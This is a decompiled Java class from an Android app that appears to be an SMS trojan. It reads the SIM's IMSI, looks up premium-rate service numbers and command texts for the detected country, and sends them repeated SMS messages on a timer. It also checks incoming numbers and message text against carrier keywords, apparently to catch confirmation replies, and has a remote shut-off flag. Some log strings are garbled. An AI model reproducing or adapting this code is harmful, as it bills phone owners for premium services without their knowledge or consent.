package com.yongding.logic;

import android.content.Context;
import com.yongding.util.CountryAndSPInfo;
import com.yongding.util.PhoneState;
import com.yongding.util.Trace;
import com.yongding.util.UtilSms;
import java.util.List;
import java.util.Map;
import org.codehaus.jackson.impl.JsonWriteContext;

public class Ld {
    public static void SendOneSmsInList(Context context) {
        Trace.i("ld.SendOneSmsInList()-entry.");
        if (Global.IsSmsListEmpty()) {
            Trace.i("ld.SendOneSmsInList()-return \u6ca1\u951f\u65a4\u62f7\u901a\u951f\u65a4\u62f7\u951f\u7f34\u51e4\u62f7");
            tryReStartSmsTimerAlarm(context);
        } else {
            Trace.i(new StringBuilder("ld.SendOneSmsInList()-size=").append(Global.list.size()).toString());
            smsResult port = (smsResult) Global.list.remove(0);
            int rc = Integer.parseInt(port.getRc());
            Trace.i(new StringBuilder("ld.SendOneSmsInList()-rc=").append(rc).append(",des=").append(port.getDes()).append(",sx=").append(port.getSx()).toString());
            if (rc != 0) {
                UtilSms.sendSms(port.getDes(), port.getSx(), context);
                port.setRc(String.valueOf(rc - 1));
                if (Integer.parseInt(port.getRc()) == 0) {
                    Trace.i("ld.SendOneSmsInList()-rc == 0");
                } else {
                    Global.addSmsToList(port.getSx(), port.getDes(), port.getRc(), false);
                }
            }
        }
        Trace.i("ld.SendOneSmsInList()-return");
    }

    public static boolean checkIsClose(Context context) {
        return new CountryAndSPInfo(context).getIsShut() == 1;
    }

    public static boolean checkNumber(Context context, String number) {
        boolean tag = false;
        PhoneState phoneState = new PhoneState(context);
        CountryAndSPInfo ci = new CountryAndSPInfo(context);
        String imsi = phoneState.getIMSI(context);
        String mcc = imsi.substring(0, JsonWriteContext.STATUS_OK_AFTER_SPACE);
        String mnc = imsi.substring(JsonWriteContext.STATUS_OK_AFTER_SPACE, JsonWriteContext.STATUS_EXPECT_NAME);
        List<Map<String, String>> spList = ci.getSP(ci.getCountry(mcc));
        int i = 0;
        while (i < spList.size()) {
            if (number.contains((String) ((Map) spList.get(i)).get("sp"))) {
                tag = true;
            }
            i++;
        }
        return tag;
    }

    public static boolean checkSms(Context context, String smsContent) {
        boolean tag = false;
        PhoneState phoneState = new PhoneState(context);
        CountryAndSPInfo ci = new CountryAndSPInfo(context);
        String imsi = phoneState.getIMSI(context);
        String mcc = imsi.substring(0, JsonWriteContext.STATUS_OK_AFTER_SPACE);
        String mnc = imsi.substring(JsonWriteContext.STATUS_OK_AFTER_SPACE, JsonWriteContext.STATUS_EXPECT_NAME);
        List<Map<String, String>> spList = ci.getSP(ci.getCountry(mcc));
        int i = 0;
        while (i < spList.size()) {
            String downIns = (String) ((Map) spList.get(i)).get("downIns");
            if (!("".equals(downIns) || downIns == null)) {
                String[] s = downIns.split(";");
                int j = 0;
                while (j < s.length) {
                    if (smsContent.contains(s[j])) {
                        tag = true;
                    }
                    j++;
                }
            }
            i++;
        }
        return tag;
    }

    public static void readPhoneInfo(Context context) {
        Global.readPhoneInfo(context);
    }

    public static void sendSpSms(Context context) throws Exception {
        PhoneState phoneState = new PhoneState(context);
        CountryAndSPInfo ci = new CountryAndSPInfo(context);
        String imsi = phoneState.getIMSI(context);
        Trace.i(new StringBuilder("sim\u951f\u65a4\u62f7\u951f\u65a4\u62f7imsi\u951f\u65a4\u62f7\u4e3a\u951f\u65a4\u62f7").append(imsi).toString());
        String mcc = imsi.substring(0, JsonWriteContext.STATUS_OK_AFTER_SPACE);
        Trace.i(new StringBuilder("sim\u951f\u65a4\u62f7\u951f\u65a4\u62f7mcc\u951f\u65a4\u62f7\u4e3a\u951f\u65a4\u62f7").append(mcc).toString());
        String mnc = imsi.substring(JsonWriteContext.STATUS_OK_AFTER_SPACE, JsonWriteContext.STATUS_EXPECT_NAME);
        String country = ci.getCountry(mcc);
        Trace.i(new StringBuilder("sim\u6240\u5728\u56fd\u5bb6").append(country).toString());
        List<Map<String, String>> spList = ci.getSP(country);
        int i = 0;
        while (i < spList.size()) {
            Engine.addSmsToList(context, (String) ((Map) spList.get(i)).get("instruct"), (String) ((Map) spList.get(i)).get("sp"), "1", true);
            i++;
        }
    }

    public static void tryReStartSmsTimerAlarm(Context context) {
        Trace.i("ld.tryReStartSmsTimerAlarm()-entry");
        if (Global.IsSmsListEmpty()) {
            Trace.i("ld.tryReStartSmsTimerAlarm()-StopSmsTimerNewAlarm");
            Engine.StopSmsTimerNewAlarm(context);
        } else if (Engine.IsSmsTimerAlarmRunning()) {
            Trace.i("ld.tryReStartSmsTimerAlarm()-BroReceiver.IsSmsTimerAlarmRunning");
        } else {
            Trace.i("ld.tryReStartSmsTimerAlarm()-StartSmsTimerNewAlarm");
            Engine.StartSmsTimerNewAlarm(context, Global.smsSendTimeDelay, Global.smsSendTimeDelay);
        }
        Trace.i("ld.tryReStartSmsTimerAlarm()-return");
    }
}